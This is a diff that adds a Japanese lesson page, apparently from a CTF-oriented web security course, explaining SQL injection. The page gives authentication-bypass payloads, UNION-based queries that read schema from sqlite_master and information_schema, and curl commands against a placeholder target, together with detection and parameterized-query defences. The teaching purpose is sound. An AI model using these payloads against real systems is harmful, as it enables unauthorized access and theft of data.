@@ -1,0 +1,197 @@
+---
+sidebar_position: 3
+draft: true
+---
+
+# SQL Injection
+
+## 前回の振り返り
+
+前回の演習では、`....//` でreplace関数のフィルタをバイパスするディレクトリトラバーサルを学びました。今回は、データベースを標的とするSQL Injectionを学びます。
+
+## 今回の目標
+
+1. **SQL Injection**の仕組みを理解する
+2. **UNION句**を使ったデータ抽出手法を学ぶ
+3. **sqlite_master**からデータベース構造を取得する方法を理解する
+
+## SQL Injectionとは
+
+**SQL Injection（SQLインジェクション）** は、Webアプリケーションへの攻撃手法の一つです。入力欄に不正なSQL文を注入し、データベースの情報を不正に取得・操作します。
+
+### 前提条件
+
+この攻撃が成立するには：
+- WebアプリケーションがSQLデータベースを使用している
+- 入力値がSQLクエリに文字列結合されている
+- 適切な入力検証やパラメータ化が行われていない
+
+### 攻撃成功時のレスポンス例
+
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"user": "admin", "flag": "FLAG{sql_injection_success}"}
+```
+
+### 攻撃失敗時のエラー例
+
+```http
+HTTP/1.1 500 Internal Server Error
+{"error": "SQL syntax error near ''"}
+```
+
+### 成功/失敗の判定基準
+
+- **成功**: flagが含まれたレスポンス、または認証バイパス後の管理画面
+- **失敗**: SQLエラー、403 Forbidden、または通常のエラーページ
+
+### 検出方法（防御側）
+
+- SQLエラーログの確認
+- WAF（Web Application Firewall）のログ
+- データベースの監査ログ
+- 不自然なクエリパターンの検出
+
+## SQLの基本（前提知識）
+
+SQLはデータベースを操作する言語です。Webアプリケーションは、ログインや検索でSQLを使います。
+
+```sql
+SELECT * FROM users WHERE username='入力値' AND password='入力値'
+```
+
+| キーワード | 意味 |
+|---|---|
+| `SELECT` | データを取得 |
+| `FROM` | テーブルを指定 |
+| `WHERE` | 条件を指定 |
+| `'...'` | 文字列リテラル（C言語の `"` と同じ） |
+| `--` | コメント（`-- ` 半角スペース＋これ以降無視） |
+
+## 攻撃の仕組み
+
+### 脆弱なコード（擬似コード）
+
+```
+クエリ = "SELECT * FROM users WHERE username='" + 入力 + "' AND password='" + 入力 + "'"
+```
+
+### 攻撃例
+
+```
+入力: admin'-- 
+```
+
+### 生成されるSQL
+
+```sql
+SELECT * FROM users WHERE username='admin'-- ' AND password='(任意)'
+```
+
+`-- ` （半角スペース付き）はSQLのコメントアウトなので、パスワードチェックが無視されます。
+
+## SQL Injectionの種類
+
+### 1. 認証バイパス
+
+ログインフォームで、パスワードチェックを回避します。
+
+```
+admin'-- 
+admin' #
+' OR '1'='1
+```
+
+- `-- ` （半角スペース付き）はSQL標準のコメント
+- `#` はMySQLのコメント
+- `' OR '1'='1` は常に真になる条件
+
+### 2. UNION Injection
+
+`UNION`句を使って、他のテーブルのデータを抽出します。
+
+```sql
+SELECT name, description FROM products WHERE id=1 UNION SELECT username, password FROM users --
+```
+
+#### カラム数の特定
+
+```
+ORDER BY 1   → OK
+ORDER BY 2   → OK
+ORDER BY 3   → エラー → カラム数は2
+```
+
+#### データベースの構造を取得
+
+テーブル名やカラム名が分からない場合、データベースのメタ情報から取得できます。
+
+**SQLiteの場合:**
+
+```sql
+UNION SELECT group_concat(sql), null FROM sqlite_master --
+```
+
+`sqlite_master` はSQLiteのシステムテーブルで、全テーブルの定義（CREATE文）が格納されています。`group_concat()` は複数の行を1つの文字列に結合する関数です。
+
+**MySQLの場合:**
+
+```sql
+UNION SELECT table_name, null FROM information_schema.tables --
+```
+
+## 実践: SQL Injection
+
+### 認証バイパス
+
+```bash
+curl -X POST https://target.com/login \
+  -d "username=admin'--&password=anything"
+```
+
+### UNION Injection
+
+```bash
+curl "https://target.com/profile?id=1+UNION+SELECT+1,2--"
+```
+
+### よく使うペイロード
+
+```
+' OR '1'='1
+' OR '1'='1' --
+admin' --
+```
+
+## 防御方法
+
+### パラメータ化クエリ（Prepared Statement）
+
+入力値とSQL構造を分離することで、Injectionを防ぎます。
+
+```
+# 悪い例（文字列連結）
+クエリ = "SELECT * FROM users WHERE id='" + 入力 + "'"
+
+# 良い例（パラメータ化）
+クエリ = "SELECT * FROM users WHERE id=?"
+実行(クエリ, 入力)
+```
+
+パラメータ化では、入力が常に「値」として扱われ、「SQL構造の一部」として解釈されません。
+
+## CTFでのポイント
+
+1. **入力欄を全て試す**: ログインフォーム、検索欄、URLパラメータ
+2. **エラーメッセージを確認**: SQLのエラーが返ってきたらSQLiの可能性
+3. **UNIONでカラム数を特定**: `ORDER BY 10` でエラーが出たらカラム数は10未満
+
+## まとめ
+
+SQL Injectionは、データベースを標的とする最も古典的かつ危険な攻撃手法です。
+
+パラメータ化クエリを使用することで、完全に防御可能です。
+
+次は、同じInjection系の**Command Injection**について学びます。SQL Injectionがデータベースを対象とするのに対し、Command InjectionはサーバーのOSを対象とします。
